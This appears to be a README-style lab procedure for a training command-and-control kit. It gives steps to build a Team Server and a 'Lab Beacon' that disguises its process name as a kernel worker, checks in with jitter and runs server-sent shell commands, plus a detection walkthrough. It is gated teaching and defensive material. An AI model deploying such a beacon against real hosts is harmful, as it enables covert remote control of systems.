# The lab procedure

This document states what to do, and why each step exists.

The text follows the writing style of ASD-STE100 Issue 9. The style does not
certify the text against the standard.

## Before you start

Make sure that all of these statements are true:

1. The Team Server runs on a machine that you own.
2. The Lab Beacon runs on a machine that you own.
3. Both machines are in a lab network. No route leaves that network.
4. You have written permission from the owner of every machine.

If any statement is false, stop. Read `docs/THREAT_MODEL.md`.

## The two gates

A command runs only after a reader takes two deliberate acts. The gates are not
a security boundary against an attacker. They are a speed bump against a
careless mistake.

| Gate | What it is | What it stops |
|---|---|---|
| 1 | The build tag `lab` | The default build has no network code. It cannot connect to anything. |
| 2 | The flag `-i-run-remote-commands` | A tagged binary checks in and then refuses every task. |

Run `make verify-gates` to check that both gates hold. The target builds both
binaries, reads the symbol table, and starts a Beacon without the flag.

## What the Lab Beacon does

Read this before you run anything. The Beacon does the following, in this order,
forever:

1. Write `[kworker/u4:2]` to the `comm` field with `prctl`.
2. Read the shared secret from the state directory.
3. Send a `GET` request to `/checkin` on the Team Server.
4. Repeat until the server answers `204`, which means no task.
5. Wait between 8 and 12 seconds.
6. If the server sends a task, run it with `/bin/bash -c`.
7. Send the output to `/results` on the Team Server.
8. Go to step 3.

The Beacon has no other function. It does not persist. It does not inject. It
does not remove itself. It does not change its executable path or its command
line. `docs/DETECTION.md` states what each of those fields shows.

## Step 1, see the whole cycle

Run the demo. It does every step for you.

```bash
make demo
```

The target builds both programs, starts the Team Server, starts the Lab
Beacon, waits for the check-in, sends `id`, prints the output, and stops.

Use this first. It proves the system works before you change anything.

## Step 2, build both binaries and look at the difference

```bash
make inert-beacon   # writes bin/beacon-inert, runs it
make lab-beacon     # writes bin/beacon
```

Compare the two files:

```bash
ls -l bin/beacon-inert bin/beacon
```

The inert build is APPROXIMATELY 2.5 MB. The tagged build is APPROXIMATELY
10.5 MB. The difference is the HTTP client and the shell.

Run `make verify-gates` to see the symbol counts.

## Step 3, start the Team Server

```bash
make run-server
```

The target listens on `127.0.0.1:8443` and uses TLS. On the first start it
writes `.state/c2.key` and `.state/team-server.crt`.

Read the banner. It prints the paths. Keep the terminal open.

## Step 4, start the Lab Beacon

Open a second terminal in the same directory.

```bash
./bin/beacon \
  -i-run-remote-commands \
  -server https://127.0.0.1:8443 \
  -secret-file .state/c2.key \
  -ca .state/team-server.crt \
  -sleep 10s \
  -jitter 20
```

Read each flag:

| Flag | Effect |
|---|---|
| `-i-run-remote-commands` | Arms the binary. Without it the Beacon refuses every task. |
| `-server` | The base address of the Team Server. |
| `-secret-file` | The shared secret. Without the right value the server answers `401`. |
| `-ca` | The Team Server certificate. Without this flag the Beacon accepts any certificate. |
| `-sleep` | The base interval between check-ins. |
| `-jitter` | The largest random change to that interval, in percent. |

**CAUTION:** WITHOUT `-ca`, THE BEACON DOES NOT CHECK THE SERVER CERTIFICATE. USE
THE FLAG WHENEVER THE NETWORK IS NOT CLOSED.

## Step 5, watch the console

The first terminal shows the check-in:

```text
[+] agent registered: e51ec4c6 (ubuntu-target) from 127.0.0.1
```

In the second terminal, run this inside the Beacon terminal only if you stopped
it with Ctrl-C. Otherwise the console of the first terminal takes the commands:

```text
c2> agents
c2> interact e51ec4c6
e51ec4c6 c2> id
task 1792180274969344750 queued for e51ec4c6

[*] result from e51ec4c6 (task 1792180274969344750):
uid=1000(operator) gid=1000(operator)
```

## Step 6, look at the host

In a third terminal, read the fields that the mask does not change.

```bash
PID=$(pgrep -f 'bin/beacon' | head -1)
echo "comm:    $(cat /proc/$PID/comm)"
echo "cmdline: $(tr '\0' ' ' < /proc/$PID/cmdline)"
echo "exe:     $(readlink /proc/$PID/exe)"
ps -p "$PID" -o pid,ppid,comm,args
```

The output has this form:

```text
comm:    [kworker/u4:2]
cmdline: ./bin/beacon -i-run-remote-commands -server https://127.0.0.1:8443 ...
exe:     /home/you/Go-ServerC2-Payload/bin/beacon
```

The `comm` field lies. The other two fields tell the truth. `docs/DETECTION.md`
explains how a defender uses that difference.

## Step 7, stop everything

Type `exit` in the Team Server console. The server closes the open connections
and stops.

## What to read next

| Document | Purpose |
|---|---|
| `docs/ARCHITECTURE.md` | How the two programs exchange data |
| `docs/DETECTION.md` | How to find the Beacon on a host and on a network |
| `docs/IOC.md` | The values that a defender searches for |
| `docs/THREAT_MODEL.md` | What an attacker can do, and what limits it |
| `docs/WRITING-STYLE.md` | How to write a document for this repository |
| `docs/GLOSSARY.md` | One term for one concept |

## The commands

| Command | Effect |
|---|---|
| `make help` | List the targets |
| `make demo` | Run the whole cycle and exit |
| `make inert-beacon` | Build and run the build that runs nothing |
| `make lab-beacon` | Build the Lab Beacon with the tag |
| `make verify-gates` | EXAMINE that both gates hold |
| `make run-server` | Start the Team Server |
| `make show-secret` | Print the shared secret |
| `make check` | Run every check that CI runs |
| `make clean` | Remove `bin`, `.demo`, `.gates`, and `coverage.out` |
